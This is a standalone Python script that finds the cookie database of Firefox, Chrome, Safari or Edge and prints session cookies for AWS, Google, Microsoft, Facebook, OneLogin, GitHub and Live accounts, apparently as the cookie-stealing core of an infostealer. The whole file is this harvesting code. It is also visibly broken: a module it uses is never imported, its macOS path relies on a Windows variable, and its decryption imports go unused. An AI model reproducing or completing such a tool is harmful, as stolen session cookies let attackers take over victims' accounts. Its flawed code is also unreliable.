import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome

# Determine the browsers to try and the operating system
browsers = ["firefox", "chrome", "safari", "edge"]
os_name = platform.system().lower()

# Define the paths based on the operating system and browsers
if os_name == "darwin":  # macOS
    browser_paths = {
        "firefox": os.path.expanduser("~/Library/Application Support/Firefox/Profiles"),
        "chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "safari": os.path.expanduser("~/Library/Safari"),
        "edge": None,  # No default profile directory for Edge on macOS
    }
elif os_name == "linux":
    browser_paths = {
        "firefox": os.path.expanduser("~/.mozilla/firefox"),
        "chrome": os.path.expanduser("~/.config/google-chrome/Default"),
        "safari": None,  # Safari is not supported on Linux
        "edge": None,  # No default profile directory for Edge on Linux
    }
elif os_name == "windows":
    browser_paths = {
        "firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox\\Profiles"),
        "chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default"),
        "safari": None,  # Safari is not supported on Windows
        "edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data\\Default"),
    }
else:
    raise Exception("Unsupported operating system.")

# Establish a connection to the cookie database for the first available browser
browser_path = None
for browser in browsers:
    profile_path = browser_paths[browser]
    if profile_path and os.path.exists(profile_path):
        if browser == "firefox":
            profile_folders = os.listdir(profile_path)
            profile_folder = profile_folders[0] if profile_folders else ""
            browser_path = os.path.join(profile_path, profile_folder, "cookies.sqlite")
        elif browser == "chrome":
            # Define the Chrome-specific paths here
            browser_path = os.path.join(profile_path, "Cookies")
        elif browser == "safari":
            # Define the Safari-specific paths here
            browser_path = os.path.join(profile_path, "Cookies.db")
        elif browser == "edge":
            # Define the Edge-specific paths here
            browser_path = os.path.join(profile_path, "Cookies")
        break

# Check if a valid browser path was found
if browser_path is None:
    raise Exception("No supported browser found.")

# Establish a connection to the cookie database
conn = sqlite3.connect(browser_path)
c = conn.cursor()

# Query the cookies table based on the browser
if browser == "firefox":
    c.execute("SELECT * FROM moz_cookies")
elif browser == "chrome" or browser == "safari":
    c.execute("SELECT * FROM cookies")
else:
    raise Exception("Unsupported browser.")

data = c.fetchall()

# Define the cookies to search for
cookies = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
}

## Print the matching cookies
# Print the matching cookies
found_cookies = False
for cookie in data:
    matched = False
    for domain in cookies:
        if cookie[4].endswith(domain) and cookie[2] in cookies[domain]:
            print("%s %s %s %s" % (browser, cookie[4], cookie[2], cookie[3][:20]))
            found_cookies = True
            matched = True
            break
    if not matched:
        found_cookies = True
        print("Other Cookie (%s): %s %s" % (browser, cookie[4], cookie[2]))

if not found_cookies:
    print("No cookies found.")